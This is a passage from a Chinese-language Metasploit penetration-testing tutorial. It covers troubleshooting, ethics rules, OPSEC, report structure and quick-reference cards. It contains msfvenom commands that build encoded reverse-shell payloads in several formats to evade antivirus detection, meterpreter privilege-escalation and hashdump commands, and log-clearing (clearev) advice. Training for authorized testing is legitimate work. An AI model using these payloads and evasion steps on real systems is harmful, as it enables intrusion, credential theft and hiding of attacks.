# 1. 尝试不同的提权技术
meterpreter > getsystem -t 1
meterpreter > getsystem -t 2
meterpreter > getsystem -t 3

# 2. 使用本地提权漏洞
meterpreter > run post/multi/recon/local_exploit_suggester

# 3. 迁移到高权限进程
meterpreter > ps
meterpreter > migrate <high_priv_pid>
```

### 9.7 编码与免杀相关错误

```bash
# 错误：Payload too large
# 原因：编码后 Payload 超过缓冲区大小
# 解决：
# 1. 减少编码迭代次数
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -e x86/shikata_ga_nai -i 3 -f exe

# 2. 使用更小的 Payload
# 使用 singles 而不是 staged
msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=y -f exe

# 错误：Bad characters in payload
# 原因：Payload 包含目标不接受的字符
# 解决：
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -b '\x00\x0a\x0d' -f exe
```

---

## 10. 最佳实践与安全建议

### 10.1 渗透测试道德准则

在进行任何渗透测试之前，请务必遵守以下准则：

```
┌─────────────────────────────────────────────────────────────────┐
│                    渗透测试道德准则                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ✓ 始终获得书面授权                                            │
│   ✓ 明确测试范围和边界                                          │
│   ✓ 保护客户数据和隐私                                          │
│   ✓ 及时报告发现的漏洞                                          │
│   ✓ 不造成不必要的损害                                          │
│   ✓ 遵守当地法律法规                                            │
│                                                                 │
│   ✗ 不要在未授权系统上测试                                      │
│   ✗ 不要泄露客户敏感信息                                        │
│   ✗ 不要利用漏洞进行非法活动                                    │
│   ✗ 不要超出授权范围                                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 10.2 操作安全（OPSEC）

在进行渗透测试时，保护自己的身份和操作安全同样重要：

```bash
# 1. 使用 VPN 或 Tor
# 在进行外部测试时，使用 VPN 保护真实 IP

# 2. 使用专用测试环境
# 不要在个人电脑上直接进行测试

# 3. 清理日志和痕迹
meterpreter > clearev

# 4. 使用加密通信
# 优先使用 HTTPS Payload
set PAYLOAD windows/meterpreter/reverse_https

# 5. 定期更换 IP 和端口
# 避免被检测和封锁
```

### 10.3 测试前检查清单

```bash
# 测试前检查清单
□ 获得书面授权
□ 明确测试范围（IP 范围、时间窗口）
□ 备份重要数据
□ 准备应急联系方式
□ 配置测试环境
□ 更新 Metasploit 和模块
□ 测试网络连通性
□ 准备报告模板
```

### 10.4 报告编写建议

渗透测试报告是整个测试过程的最终产出，应该包含以下内容：

```
渗透测试报告结构
├── 1. 执行摘要
│   ├── 测试目标
│   ├── 测试范围
│   ├── 关键发现
│   └── 风险评级
├── 2. 测试方法
│   ├── 使用的工具
│   ├── 测试流程
│   └── 时间线
├── 3. 详细发现
│   ├── 漏洞描述
│   ├── 影响分析
│   ├── 复现步骤
│   └── 证据截图
├── 4. 风险评估
│   ├── CVSS 评分
│   └── 业务影响
├── 5. 修复建议
│   ├── 短期措施
│   └── 长期措施
└── 6. 附录
    ├── 原始数据
    └── 工具输出
```

### 10.5 持续学习资源

```
推荐学习资源
├── 官方文档
│   └── https://docs.metasploit.com/
├── 在线平台
│   ├── HackTheBox (hackthebox.com)
│   ├── TryHackMe (tryhackme.com)
│   └── VulnHub (vulnhub.com)
├── 书籍
│   ├── 《Metasploit 渗透测试指南》
│   ├── 《The Hacker Playbook》系列
│   └── 《Penetration Testing》
├── 认证
│   ├── OSCP (Offensive Security Certified Professional)
│   ├── CEH (Certified Ethical Hacker)
│   └── GPEN (GIAC Penetration Tester)
└── 社区
    ├── Rapid7 社区
    ├── Reddit r/netsec
    └── Twitter #infosec
```

### 10.6 版本更新与维护

```bash
# 保持 Metasploit 更新
# Kali Linux
sudo apt update
sudo apt install metasploit-framework

# 更新模块数据库
msf6 > reload_all

# 检查版本
msf6 > version

# 查看最新模块
msf6 > search cve:2024
msf6 > search cve:2025
```

---

## 附录：快速参考卡

### 常用命令速查

```bash
# 基础命令
msfconsole              # 启动 MSF
search <keyword>        # 搜索模块
use <module>            # 使用模块
info                    # 查看模块信息
show options            # 查看参数
set <option> <value>    # 设置参数
exploit / run           # 执行
back                    # 返回
exit                    # 退出

# 数据库命令
db_status               # 数据库状态
workspace               # 工作区管理
hosts                   # 主机列表
services                # 服务列表
vulns                   # 漏洞列表
creds                   # 凭证列表
db_nmap                 # Nmap 扫描

# 会话命令
sessions                # 列出会话
sessions -i <id>        # 进入会话
sessions -k <id>        # 终止会话
background              # 后台运行

# Meterpreter 命令
sysinfo                 # 系统信息
getuid                  # 当前用户
getsystem               # 提权
hashdump                # 导出哈希
shell                   # 系统 shell
upload / download       # 文件传输
migrate <pid>           # 进程迁移
```

### 常用 Payload 速查

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# 跨平台
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
```

### MSFvenom 速查

```bash
# 生成 Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# 生成 Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# 生成 PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php

# 生成 Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.py

# 生成 WAR
msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# 带编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```

---

> 本笔记持续更新中，最后更新：2025年12月
> 
> 免责声明：本笔记仅供安全研究和授权渗透测试学习使用。
> 未经授权对他人系统进行渗透测试是违法行为。
> 请遵守当地法律法规，合法合规地使用这些知识。
